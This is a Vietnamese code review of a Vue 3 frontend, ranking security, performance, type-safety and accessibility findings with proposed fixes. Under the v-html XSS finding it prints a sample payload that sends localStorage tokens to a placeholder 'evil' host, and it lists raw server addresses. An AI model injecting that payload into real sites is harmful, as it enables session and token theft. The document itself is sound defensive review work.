# FRONTEND CODE REVIEW — APSP

> **Ngày review:** 2026-04-29  
> **Phạm vi:** `E:\APSP\FULL_PROJECT\frontend\` (Vue 3 + Vite + PrimeVue)  
> **Quy mô:** 426 .vue file (49 components + 377 views), 28 Pinia store, 6 store legacy.  
> **Phương pháp:** Static analysis, không sửa code.  
> **Tổ chức:** Sắp xếp theo mức độ Critical → High → Medium → Low.

---

## 📊 Bảng tổng hợp

| Mức độ | Vue/Architecture | Bảo mật | Performance | API/Type | UX/A11y | Tổng |
|---|---|---|---|---|---|---|
| **Critical** | 1 | 4 | 3 | 0 | 0 | **8** |
| **High** | 3 | 2 | 4 | 2 | 2 | **13** |
| **Medium** | 5 | 3 | 3 | 2 | 3 | **16** |
| **Low** | 2 | 1 | 0 | 0 | 0 | **3** |

---

## 🔴 CRITICAL (8)

### C-1. OpenAI API key được expose trong frontend bundle
**Files:**
- [src/views/admin/Promotion/composables/usePromotionEdit.js:884](frontend/src/views/admin/Promotion/composables/usePromotionEdit.js)
- [src/views/client/pages/detail/index.vue:212](frontend/src/views/client/pages/detail/index.vue)

```javascript
const res = await fetch('https://api.openai.com/v1/chat/completions', {
    headers: { Authorization: `Bearer ${import.meta.env.VITE_APP_OPENAI_KEY}` },
    ...
});
```

**Vì sao Critical:** `VITE_*` env vars **được bundle vào JS gửi xuống browser**. Bất kỳ user/script nào cũng có thể đọc key từ bundle hoặc Network tab → đánh cắp quota OpenAI, gây thiệt hại tài chính. Đây là lỗi rất phổ biến nhưng nghiêm trọng.

**Đề xuất:** Tạo backend proxy endpoint `POST /api/ai/promote-name`. Frontend gọi backend, backend giữ key. Rotate OpenAI key ngay (giả định đã lộ).

---

### C-2. JWT + refresh token lưu plaintext trong localStorage
**Files:**
- [src/api/api-main.ts:71-83](frontend/src/api/api-main.ts)
- [src/Pinia/auth.ts:28, 58](frontend/src/Pinia/auth.ts)
- [src/helpers/auth-header.helper.ts:4](frontend/src/helpers/auth-header.helper.ts)

```typescript
const stored = localStorage.getItem('user');
const user = stored ? JSON.parse(stored) : null;
// ...
user.token = data.token;
user.refreshToken = data.refreshToken;
localStorage.setItem('user', JSON.stringify(user));
```

**Vì sao Critical:** JWT + refresh token nằm trong localStorage = **bất kỳ XSS nào** (kể cả từ third-party script, browser extension, hoặc qua `v-html` ở mục C-4) đều có thể đánh cắp toàn bộ phiên người dùng. Refresh token có lifetime dài → attacker giữ quyền truy cập kéo dài. Không có HttpOnly flag.

**Đề xuất:** Backend set token vào HttpOnly + Secure + SameSite cookie. Frontend không cần đọc token. Hoặc giữ tạm trong memory + sliding refresh ngắn (5-15 phút), không persist.

---

### C-3. Cookie injection từ external domain (`fox.ai.vn`)
**File:** [src/views/client/pages/PurchaseOrder/views/CheckOut.vue:572-575](frontend/src/views/client/pages/PurchaseOrder/views/CheckOut.vue)

```typescript
const ress = await axios.get("https://fox.ai.vn/vnpay_php/vnpay_return.php");
const sessionId = ress.data.session_id;
document.cookie = `PHPSESSID=${sessionId}; path=/;`;
```

**Vì sao Critical:** Frontend nhận `session_id` từ một domain ngoài rồi tự set vào `document.cookie` (không HttpOnly, không Secure). Nếu MITM hoặc `fox.ai.vn` bị compromised, attacker inject session ID tuỳ ý → session fixation. Ngoài ra dòng [CheckOut.vue:480](frontend/src/views/client/pages/PurchaseOrder/views/CheckOut.vue) còn gửi JWT của APSP sang `fox.ai.vn` qua POST.

**Đề xuất:** Toàn bộ flow VNPay phải đi qua backend APSP. Backend gọi VNPay (hoặc proxy fox.ai.vn), set cookie qua Set-Cookie header với HttpOnly + Secure.

---

### C-4. XSS qua `v-html` không sanitize — 12 chỗ
**Files (tóm tắt):**
- [src/layout/AppMenuItem.vue:194, 209](frontend/src/layout/AppMenuItem.vue) — search highlight (user input!)
- [src/views/client/pages/detail/index.vue:59, 62, 65, 84](frontend/src/views/client/pages/detail/index.vue) — product description/note/feature/spec
- [src/views/client/pages/detail/no_login.vue:62, 119](frontend/src/views/client/pages/detail/no_login.vue)
- [src/views/client/pages/home/components/ProductsCard.vue:158](frontend/src/views/client/pages/home/components/ProductsCard.vue)
- [src/views/admin/MasterData/AgenMan/AgencyGroup.vue:57](frontend/src/views/admin/MasterData/AgenMan/AgencyGroup.vue)
- 6 file `OrderSummary*.vue` khác.

```javascript
// AppMenuItem.vue — đặc biệt nguy hiểm vì là user input trực tiếp
queryWords.forEach(word => {
    const regex = new RegExp(`(${word})`, 'gi');     // ❌ regex injection
    result = result.replace(regex, '<mark>$1</mark>');
});
return result;   // → v-html
```

**Vì sao Critical:** Product description đến từ admin/CKEditor → có thể chứa HTML từ trình soạn thảo. Search highlight thì là **user input thật** → user nhập `<img src=x onerror="fetch('//evil/?'+localStorage.user)">` ngay vào ô search → kết hợp với C-2 → token bị đánh cắp. Dự án dùng PrimeVue không có DOMPurify.

**Đề xuất:** Cài `dompurify` và bọc qua helper:
```typescript
import DOMPurify from 'dompurify';
export const safeHtml = (raw: string) => DOMPurify.sanitize(raw, { USE_PROFILES: { html: true } });
```
Với search highlight thì nên render bằng `<template>` + slot thay vì v-html, hoặc escape regex và escape HTML đầu vào trước khi tạo `<mark>`.

---

### C-5. `:key="index"` trong v-for ở 25 component
**Files (sample):**
- [src/views/admin/Discount/Discount.vue:94](frontend/src/views/admin/Discount/Discount.vue)
- [src/components/OutputCheck.vue:6-7](frontend/src/components/OutputCheck.vue)
- [src/components/AddApprovalersComp.vue](frontend/src/components/AddApprovalersComp.vue)
- ... 22 file khác.

```vue
<div v-for="(line, i) in currentCommitedData" :key="i">
```

**Vì sao Critical:** Khi list reorder/insert/delete, Vue dùng index làm key sẽ **không nhận ra** item nào thực sự thay đổi → patch sai DOM, **state form trong row bị lệch sang row khác** (rất nguy hiểm với form nhập liệu nhiều dòng), focus mất, animation sai. Đây không chỉ là perf mà là correctness.

**Đề xuất:** Dùng id thật: `:key="line.id"` (hoặc composite key). Nếu tạm thời chưa có id, generate UUID khi push vào array.

---

### C-6. Lodash full import — 74 file kéo cả thư viện
**Files (sample):**
- [src/components/order/AddProducts.vue:4](frontend/src/components/order/AddProducts.vue)
- [src/views/admin/CommittedOutput/index2.vue:10](frontend/src/views/admin/CommittedOutput/index2.vue)
- [src/views/client/pages/cart/index.vue:5](frontend/src/views/client/pages/cart/index.vue)
- ... 71 file khác.

```javascript
import { cloneDeep, groupBy, merge, debounce } from 'lodash';   // ❌ ~70KB gzip
```

**Vì sao Critical:** Mặc dù có named import, lodash main entry không tree-shake được tốt khi dùng theo `from 'lodash'` — bundler vẫn kéo cả `lodash/index.js` (~70KB gzip / 250KB raw). 74 file × kéo nhiều function → bundle phình to vài trăm KB không cần thiết, ảnh hưởng FCP/TTI rõ rệt trên 3G.

**Đề xuất:** Đổi sang named module:
```javascript
import cloneDeep from 'lodash/cloneDeep';
import debounce  from 'lodash/debounce';
```
Hoặc dùng `lodash-es` + `optimizeDeps.include` trong vite. Tốt hơn nữa là thay bằng `@vueuse/core` (đã có trong project) cho debounce/throttle, native methods cho clone/groupBy.

---

### C-7. 9 file còn `debugger` statement
**Files:**
- [src/components/OutputCheck.vue](frontend/src/components/OutputCheck.vue)
- [src/Pinia/PurchaseOrder.ts](frontend/src/Pinia/PurchaseOrder.ts)
- [src/Pinia/temp.js](frontend/src/Pinia/temp.js)
- [src/views/admin/MasterData/SupplyItems/ProductData.vue](frontend/src/views/admin/MasterData/SupplyItems/ProductData.vue)
- ... 5 file khác.

**Vì sao Critical:** Nếu user mở DevTools (vô tình hoặc intentional), `debugger` sẽ pause execution → app treo. Trên production hoàn toàn không nên có. Và `src/Pinia/temp.js` cho thấy có file scratch chưa dọn.

**Đề xuất:** Cấu hình Vite/Terser drop `debugger` ở build:
```js
build: { terserOptions: { compress: { drop_debugger: true, drop_console: true } } }
```
Đồng thời thêm ESLint rule `no-debugger: error` để CI block.

---

### C-8. Test coverage 0 cho frontend (không có test file thật)
**File:** Chỉ có test target `src/helpers/`, `src/utils/`, `src/Pinia/`, `src/composables/` trong `vite.config.mjs`, nhưng search ra **rất ít** test file thực sự.

**Vì sao Critical:** Vitest đã setup, CI có chạy `npm test`, nhưng không test gì → false sense of safety. Toàn bộ logic xử lý đơn hàng, khuyến mãi, payment, approval không có safety net nào khi refactor.

**Đề xuất:** Bắt đầu từ Pinia stores (đặc biệt `PurchaseOrder.ts` 520 dòng), `auth.ts`, `cart.js`, helpers, composables. Sau đó component test (`@vue/test-utils`) cho form chính.

---

## 🟠 HIGH (13)

### H-1. Component khổng lồ (>1000 dòng) — 10 file đầu
**Files:**
| File | Dòng |
|---|---|
| [views/admin/CommittedOutput/index2.vue](frontend/src/views/admin/CommittedOutput/index2.vue) | 1676 |
| [views/admin/PurchaseOrder/DetailOrder.vue](frontend/src/views/admin/PurchaseOrder/DetailOrder.vue) | 1658 |
| [views/admin/Discount/Discount.vue](frontend/src/views/admin/Discount/Discount.vue) | 1487 |
| [views/admin/Voucher/voucher.vue](frontend/src/views/admin/Voucher/voucher.vue) | 1462 |
| [views/common/ReturnRequest/ReturnRequestDetail.vue](frontend/src/views/common/ReturnRequest/ReturnRequestDetail.vue) | 1312 |
| [views/admin/PurchaseRequest/Detail.vue](frontend/src/views/admin/PurchaseRequest/Detail.vue) | 1174 |
| [views/admin/MasterData/AgenMan/AgencyCategory.vue](frontend/src/views/admin/MasterData/AgenMan/AgencyCategory.vue) | 1164 |
| [views/admin/Consignment_Fee/WarehouseStorageFee.vue](frontend/src/views/admin/Consignment_Fee/WarehouseStorageFee.vue) | 1081 |
| [views/client/.../productionCommitment.vue](frontend/src/views/client/pages/user_menu/components/productionCommitment.vue) | 959 |
| [views/admin/Coupon/Coupon.vue](frontend/src/views/admin/Coupon/Coupon.vue) | 938 |

**Đề xuất:** Mỗi file tách thành ~3-5 sub-component (Header/Filter, List/Table, EditDialog, sub-form), business logic vào composable (`useCommittedOutput.ts`, `usePurchaseOrderDetail.ts`).

---

### H-2. ExcelJS bundle vào main chunk
**Files:**
- [src/helpers/exportFile.helper.js:1](frontend/src/helpers/exportFile.helper.js) — `import ExcelJS from "exceljs";`
- [src/views/admin/CommittedOutput/index2.vue:9](frontend/src/views/admin/CommittedOutput/index2.vue)

ExcelJS ~1.2MB. Người dùng không export Excel cũng phải tải xuống.

**Đề xuất:**
```javascript
const handleExport = async () => {
    const ExcelJS = (await import('exceljs')).default;
    // ...
};
```
(Project đã có pattern lazy này ở `ProductDataRetailEdit.vue:259`)

---

### H-3. 30+ component register global trong `main.js`
**File:** [src/main.js:21-137](frontend/src/main.js)

```javascript
app.component('OutputCheck', OutputCheck);
app.component('ProgressTimeLine', ProgressTimeLine);
// ... 35 dòng tương tự
```

**Vì sao:** Tất cả 30+ component được nạp ngay khi app start, kể cả route không dùng. `unplugin-vue-components` đã setup nhưng chỉ dùng `PrimeVueResolver`.

**Đề xuất:** Thêm `dirs: ['src/components']` vào Components plugin, hoặc giữ nguyên nhưng `defineAsyncComponent` cho component nặng (PDF, CKEditor, OutputCheck).

---

### H-4. Pinia store `PurchaseOrder.ts` bloated 520 dòng
**File:** [src/Pinia/PurchaseOrder.ts](frontend/src/Pinia/PurchaseOrder.ts)

Chứa class `PromotionPayload` (35 prop), interface `CommittedLineSub` (50+ prop), nhiều computed phức tạp, business logic tính promotion lẫn vào.

**Đề xuất:** Tách:
```
src/Pinia/Purchase/types.ts                  // PromotionPayload, CommittedLineSub interfaces
src/Pinia/Purchase/usePurchaseOrder.ts       // store actions/state
src/composables/usePromotionCalculator.ts    // logic tính khuyến mãi
```

---

### H-5. Business logic nằm trong component thay vì store/composable
**Files:**
- [src/views/admin/CommittedOutput/index2.vue:150+](frontend/src/views/admin/CommittedOutput/index2.vue) — 150+ dòng logic + API call inline
- [src/components/OutputCheck.vue:250-450](frontend/src/components/OutputCheck.vue) — 140+ dòng transform data trong computed

**Đề xuất:** Extract `useCommittedOutput.ts` composable, helper `transformCommittedData()`. Component chỉ giữ template + binding.

---

### H-6. Empty `catch {}` block — 10+ chỗ silent failure
**File sample:** [src/components/AddOrdersShipComp.vue:277-280](frontend/src/components/AddOrdersShipComp.vue)

```typescript
try {
    const res = await API.get(`Customer?search=${key}`);
    ...
} catch (error) {              // ❌ rỗng
} finally {
    isLoading.value = false;
}
```

**Vì sao:** User thấy spinner xong app im lặng. Network error / 500 không log, không toast → khó debug, UX kém.

**Đề xuất:** Tối thiểu `console.error(error)` (qua logger service ở H-12), hoặc toast user-facing nếu là error có thể recovery.

---

### H-7. Direct `axios` bypass API wrapper
**File:** [src/views/client/pages/PurchaseOrder/views/CheckOut.vue:479, 573](frontend/src/views/client/pages/PurchaseOrder/views/CheckOut.vue)

```typescript
const ress = await axios.post("https://fox.ai.vn/vnpay_php/vnpay_create_payment.php", dataform);
```

Bỏ qua interceptor (refresh token, error handler), không timeout, không retry. Liên quan tới C-3.

**Đề xuất:** Đi qua backend APSP. Thêm ESLint rule `no-restricted-imports: ['axios']` ở scope `src/views/`.

---

### H-8. `console.log/error` rải rác — 323 chỗ trong 163 file
**Sample:**
- [src/api/api-main.ts](frontend/src/api/api-main.ts) — `console.error('[API] Request timed out: ...')`
- [src/views/admin/Dashboard/Dashboard.vue:128](frontend/src/views/admin/Dashboard/Dashboard.vue)

**Vì sao:** Production bị log error chi tiết ra console (lộ endpoint, payload, có thể PII). Tăng bundle ~15-20KB. Một số chỗ log object lớn → leak performance.

**Đề xuất:** Cấu hình Terser `drop_console: true` cho production build. Tạo `src/services/logger.ts` cho dev — production log lên error tracking (Sentry).

---

### H-9. `deep: true` watch trên 15 component với object lớn
**Files:**
- [src/components/CustomerSelector.vue:469](frontend/src/components/CustomerSelector.vue)
- [src/views/admin/CommittedOutput/index2.vue:834](frontend/src/views/admin/CommittedOutput/index2.vue)
- [src/views/client/pages/cart/index.vue:349](frontend/src/views/client/pages/cart/index.vue)
- ...12 file khác.

**Vì sao:** Vue phải traverse toàn bộ object tree mỗi lần property bất kỳ thay đổi → 50-200ms lag với list 500+ item.

**Đề xuất:** Watch chính xác getter `() => obj.specificField`, hoặc dùng `watchEffect` chọn lọc, hoặc cấu trúc lại state thành các `ref` riêng.

---

### H-10. Inline function/object trong template — 224 chỗ
**Sample:** [src/views/admin/Discount/Discount.vue:104](frontend/src/views/admin/Discount/Discount.vue)
```vue
<Button @click="() => openDialog(item)" :style="{ width: '85%' }" />
```

**Vì sao:** Mỗi render parent tạo function/object reference mới → child component thấy prop "thay đổi" → re-render không cần thiết.

**Đề xuất:** Khai báo `const handleOpen = (item) => openDialog(item)` và `const dialogStyle = { width: '85%' }` trong `<script setup>`.

---

### H-11. Watch không cleanup trong component có thể unmount sớm
**File:** [src/components/OutputCheck.vue:784-800](frontend/src/components/OutputCheck.vue)

```typescript
watch(() => props.customer?.id, (id) => { if (id) GetOrderDetail(); });
watch(() => props.productsSelected?.length, (v) => { if (v) onChoseProduct(...); });
// ❌ không lưu stop handle, không onUnmounted
```

**Vì sao:** Trong Composition API, watch declare ở `<script setup>` tự cleanup khi unmount → **trường hợp này thường OK**. Vấn đề thật xảy ra khi watch đang fire-and-forget API call mà component đã unmount → setState trên unmounted component (lỗi console) hoặc race condition.

**Đề xuất:** Dùng `AbortController` cho fetch hoặc check `isMounted()` trước khi mutate state.

---

### H-12. Type safety yếu — 44 chỗ dùng `any`, mixed JS/TS
**Files & metrics:**
- 24 vị trí `: any` trong [src/api/api-main.ts](frontend/src/api/api-main.ts), [src/Pinia/auth.ts](frontend/src/Pinia/auth.ts), [src/Pinia/PurchaseOrder.ts](frontend/src/Pinia/PurchaseOrder.ts), v.v.
- 3 chỗ `as any` cast.
- 208 file JS / 210 file TS — chỉ ~50% TypeScript coverage.
- `[key: string]: any` index signature ở `AppUser`/`AuthUser` ([src/Pinia/auth.ts:16, 24](frontend/src/Pinia/auth.ts)) → vô hiệu hoá type checking.

**Đề xuất:** Bật ESLint `@typescript-eslint/no-explicit-any: error`. Tạo type response API chuẩn:
```typescript
interface ApiResponse<T> { success: boolean; data: T; errors?: string[]; }
```
Bỏ index signature `[key: string]: any` trong auth model.

---

### H-13. Icon-only button thiếu `aria-label` — 25+ chỗ
**Sample:**
- [src/components/OutputCheck.vue:18-22](frontend/src/components/OutputCheck.vue)
  ```vue
  <Button icon="pi pi-eye" text @click="OpenDetail(...)" />  <!-- không label/aria -->
  ```
- [src/views/admin/Discount/Discount.vue:47](frontend/src/views/admin/Discount/Discount.vue)
  ```vue
  <Button icon="pi pi-align-justify" @click="op.toggle($event)" />
  ```

**Vì sao:** Screen reader đọc "button" mà không biết chức năng → vi phạm WCAG 2.1 Level A.

**Đề xuất:** Thêm `aria-label="Xem chi tiết"` (hoặc `t('common.btn_view')`).

---

## 🟡 MEDIUM (16)

### M-1. 13 file chưa migrate sang `<script setup>`, props không type
**Files (sample):** [src/components/OutputCheck.vue:235-241](frontend/src/components/OutputCheck.vue)
```typescript
const props = defineProps(["customer","payload","productsSelected","commited","tienGiamSanLuong"]);
```
Đề xuất: chuyển sang `defineProps<{ customer: Customer; ... }>()`.

---

### M-2. Duplicate store legacy ở `src/views/*/store/` — 6 nơi
**Folders:** `views/admin/OrderNET/store/`, `views/client/pages/user_menu/components/store/`, `views/common/Order/store/`, `views/common/PurchaseOrder/store/`, `views/common/PurchaseOrderVPKM/store/`. Mỗi nơi định nghĩa Pinia store riêng, không nằm trong `src/Pinia/`. Khó tìm, khó share state.

**Đề xuất:** Move toàn bộ về `src/Pinia/` theo namespace.

---

### M-3. Filter store rời rạc — 5 file rất nhỏ giống nhau
**Files:** `src/Pinia/Filter/FilterPromotionData.js`, `FilterPromotionDataNEW.js`, `FilterPromotionDataPay.js`, `FilterStoreCommitted.js`, `FilterStorePurchaseOrder.js` — mỗi cái 35-91 dòng, logic gần giống. Đề xuất gộp thành generic `useFilterStore(namespace)` factory.

---

### M-4. Magic strings/numbers trong business logic
**File:** [src/components/OutputCheck.vue:254-290](frontend/src/components/OutputCheck.vue)
```typescript
const lineType = { Q: t('client.quarter'), Y: t('client.month'), P: "Gói" };
if (type_code == "Q") return getCurrentQuarter();
```
Đề xuất `enum CommittedType { Quarter = 'Q', Month = 'Y', Package = 'P' }` trong `src/constants/`.

---

### M-5. Error handling pattern không nhất quán
- Có chỗ dùng `try/catch + toast`, chỗ `.then().catch()`, chỗ catch rỗng. Tạo composable `useAsyncTask()` chuẩn hoá: loading state + error toast + retry.

---

### M-6. Refresh token có khả năng race condition
**File:** [src/api/api-main.ts:34-97](frontend/src/api/api-main.ts) — biến module-level `_isRefreshing` + `_failedQueue`. Vì JS single-thread nên thực tế ít gặp lỗi, nhưng không có version check → khi rotate token, request đang trong flight có thể giữ token cũ và thử lại. Thêm `_tokenVersion` counter.

---

### M-7. Username (PII) lưu localStorage
**Files:** [src/views/client/pages/login/index.vue:50](frontend/src/views/client/pages/login/index.vue), [src/views/client/layout_nologin/headerClient.vue:50](frontend/src/views/client/layout_nologin/headerClient.vue)

`localStorage.setItem('username', ...)` cho "remember me". Nên dùng `sessionStorage` nếu chỉ trong session, hoặc giữ ở backend (cookie HttpOnly).

---

### M-8. Image >200KB không lazy-load
**Assets:**
- `src/assets/images/logo-removebg-preview.png` 204K
- `src/assets/images/group-23.png` 173K
- `src/assets/images/new-logo-ap.png` 101K
- ... tổng ~900KB.

**Đề xuất:** Convert logo PNG → SVG (logo nhỏ <10KB), thêm `loading="lazy"` cho ảnh below-the-fold (Dashboard product images).

---

### M-9. Form validation chỉ chạy khi submit
**File:** [src/views/admin/Discount/Discount.vue:120](frontend/src/views/admin/Discount/Discount.vue)
```vue
:invalid="submited && !dataEdit.promotionName"
```
Thiếu state `touched`/`blurred`. UX: user phải submit mới biết sai. Đề xuất pattern `submitted || touched` cho mỗi field.

---

### M-10. Form input thiếu `<label>` đi kèm `id`
**File:** [src/views/admin/Discount/Discount.vue:40-49](frontend/src/views/admin/Discount/Discount.vue)
```vue
<InputText placeholder="Tìm kiếm theo mã, tên đợt phát hành" />
```
Chỉ có placeholder → screen reader không đọc được context. Thêm `<label for="...">` hoặc `aria-label`.

---

### M-11. Hardcode tiếng Việt còn ~5% trong admin views
**Sample:** [src/views/admin/Discount/Discount.vue:6, 20, 28, 40, 46, 60](frontend/src/views/admin/Discount/Discount.vue)
```vue
<h3>Khuyến mại</h3>
<label>Tất cả</label>
<Button label="Khuyến mại" />
```
Theo i18n sprint plan: Phase 1-2 done, Phase 3-5 còn ~135 file. Continue plan.

---

### M-12. 56 file dùng `setInterval/setTimeout` — cần audit cleanup
**Status:** Một số chỗ tốt (Dashboard, useIdleTimeout có cleanup). Còn 56 file cần kiểm tra `clearInterval`/`clearTimeout` trong `onUnmounted`.

---

### M-13. .env files dùng IP + non-standard port
**Files:**
- `.env.uat`: `http://160.30.252.14:8070/api/`  ← IP raw
- `.env.production`: `https://portal.apsaigonpetro.com:8023/api/`  ← port 8023

**Đề xuất:** UAT nên có DNS riêng. Tạo `.env.example` không chứa secret để dev mới setup nhanh.

---

### M-14. Props drilling 3+ cấp ở một số nhánh
- `PaymentOrder.vue → AddProducts.vue → ItemRow.vue` truyền `customer`, `promotions`, `paymentMethods`. Đã có `usePurchaseOrderStore()` nhưng không dùng triệt để.

**Đề xuất:** Component sâu inject từ Pinia store thay vì nhận prop.

---

### M-15. `[key: string]: any` trong type Auth model
**File:** [src/Pinia/auth.ts:16, 24](frontend/src/Pinia/auth.ts)
```typescript
interface AppUser { userType: string; cardId: number | null; [key: string]: any; }
```
Bỏ index signature, định nghĩa rõ field từ backend response.

---

### M-16. Thiếu CSP / security header (frontend deploy config)
- `frontend/vercel.json` không thấy CSP rule.
- Không có `<meta http-equiv="Content-Security-Policy">` trong `index.html`.

**Đề xuất:** Thêm CSP header tối thiểu khoá `script-src 'self'`, `frame-ancestors 'none'`, đặc biệt sau khi đã bỏ `v-html` không sanitize.

---

## 🟢 LOW (3)

### L-1. Filter store rất nhỏ (35 dòng) — gộp lại
Đã đề cập M-3.

### L-2. File tên copy: `views/common/PurchaseOrder copy/`
**File:** [src/views/common/PurchaseOrder copy/components/OrderSummary.vue:6](frontend/src/views/common/PurchaseOrder%20copy/components/OrderSummary.vue) — folder có dấu space và "copy" → khả năng cao là dead code. Cần xác minh và xoá.

### L-3. `src/Pinia/temp.js` — file scratch để lại
Có chứa `debugger`. Xoá hoặc move sang `_archive/`.

---

## ✅ Điểm tích cực đã ghi nhận

- **Lazy loading routes:** 100% routes dùng `() => import(...)` ([src/router/index.js](frontend/src/router/index.js)). 👍
- **PrimeVue auto-import** qua `unplugin-vue-components` + `PrimeVueResolver` — tree-shake tốt.
- **date-fns** thay cho moment.js (smaller, tree-shakeable).
- **jsPDF + xlsx** đã lazy import ở [ExportFiles.vue:124-125](frontend/src/views/client/pages/user_menu/components/dialogs/ExportFiles.vue) (chỉ ExcelJS bị sót — H-2).
- **96% file dùng Composition API** + `<script setup>` — convention nhất quán.
- **`ref` vs `reactive`** dùng đúng (249 ref / 16 reactive — phù hợp).
- **Computed pure** — không tìm thấy side-effect trong computed.
- **Template không có `.value`** — unwrap đúng.
- **Refresh token interceptor có queue** ([api-main.ts:34-97](frontend/src/api/api-main.ts)) tránh storm 401.
- **Idle timeout cleanup** ([useIdleTimeout.js:128-157](frontend/src/composables/useIdleTimeout.js)) — pattern chuẩn.
- **TypeScript strict mode bật** trong [tsconfig.json](frontend/tsconfig.json).
- **i18n hạ tầng** đã có (vue-i18n 11.x, vi.json + en.json ~2670 dòng), Phase 1-2 hoàn thành.

---

## 🎯 Khuyến nghị thứ tự ưu tiên

| Sprint | Hạng mục | Effort |
|---|---|---|
| **P0 (1-2 ngày)** | C-1 chuyển OpenAI key sang backend proxy + rotate | 4h |
| **P0** | C-7 xoá `debugger` + Terser drop_debugger/drop_console | 1h |
| **C-3 cookie injection** — gỡ flow `fox.ai.vn` direct, route qua backend | 4h |
| **P1 (tuần này)** | C-4 cài DOMPurify + sanitize 12 v-html | 4h |
| **P1** | C-2 chuyển token sang HttpOnly cookie (cần phối hợp backend) | 8h |
| **P1** | C-5 fix `:key="index"` → id thật ở 25 component | 6h |
| **P1** | C-6 đổi lodash imports (74 file) | 5h |
| **P2 (sprint sau)** | H-1 tách 10 component lớn nhất | 40h |
| **P2** | H-2 lazy ExcelJS | 1h |
| **P2** | H-4 tách `PurchaseOrder.ts` | 6h |
| **P2** | H-8 logger service + drop console prod | 3h |
| **P2** | H-13 thêm aria-label cho icon button (25 chỗ) | 2h |
| **P2** | C-8 viết Vitest cho store/composable/helper | 40h |
| **P3 (backlog)** | M-1..M-16, L-1..L-3 + i18n Phase 3-5 | rải rác |

**Lưu ý:** Bộ Critical hiện tại (đặc biệt C-1, C-2, C-4 kết hợp) tạo thành một **chuỗi tấn công khả thi**: XSS qua `v-html` chưa sanitize → đọc localStorage → đánh cắp JWT + refresh token → toàn quyền API APSP. Cần xử lý đồng thời ít nhất một mắt xích để cắt chuỗi.
